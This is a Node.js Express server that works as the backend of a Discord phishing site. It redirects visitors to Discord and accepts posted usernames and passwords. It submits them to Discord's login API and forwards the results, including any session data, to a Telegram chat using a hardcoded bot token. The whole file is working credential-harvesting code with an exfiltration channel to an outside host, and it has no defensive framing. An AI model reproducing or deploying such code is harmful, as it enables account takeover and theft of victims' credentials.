const express = require("express");
const app = express();
const bodyParser = require("body-parser");
const cors = require("cors");
const axios = require("axios");

const botToken = "6467130261:AAF7iAaqrPhgDJm7NkZGIhxgGPQ41s4jwOw";
const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

app.use(cors());
app.use(bodyParser.json());

app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "https://miniature-marabel-drake-co.koyeb.app"); // Change "*" if needed
  res.setHeader("Access-Control-Allow-Methods", "DELETE, POST, GET, OPTIONS");
  res.setHeader(
    "Access-Control-Allow-Headers",
    "Content-Type, Authorization, X-Requested-With"
  );
  next();
});

app.get("/", (req, res) => {
  res.redirect("https://discord.com/app");
});

app.get("/:one", (req, res) => {
  res.redirect("https://discord.com/app");
});

app.post("/api", (req, res) => {
  const info = req.body;
  console.log(info);

  fetch("https://discord.com/api/v9/auth/login", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      gift_code_sku_id: null,
      login: req.body.name,
      login_source: null,
      password: req.body.email,
      undelete: false
    }),
  })
    .then((response) => response.json())
    .then((data) => {
      // Успешно!
      console.log(data);
      const messageText = JSON.stringify(data);

      try {
        axios
          .post(apiUrl, {
            chat_id: "6425112328",
            text: messageText,
          })
          .then((response) => {
            console.log("successfully sent to Telegram");
          })
          .catch((error) => {
            console.error("Error sending to Telegram:", error);
          });
      } catch (error) {
        console.error("error tg send:", error);
      }
    })
    .catch((error) => {
      // Ошибка!
      console.error("Error logging in to Discord:", error);

      try {
        axios
          .post(apiUrl, {
            chat_id: "6425112328",
            text: `Error logging in to Discord: ${error.message}`,
          })
          .then((response) => {
            console.log("successfully sent error to Telegram");
          })
          .catch((error) => {
            console.error("Error sending error to Telegram:", error);
          });
      } catch (error) {
        console.error("error tg send:", error);
      }
    });

  const response = {
    endpoint: "https://www.american.bank/",
  };

  res.json(response);
});

app.listen(3000, () => {
  console.log("port 3000");
});
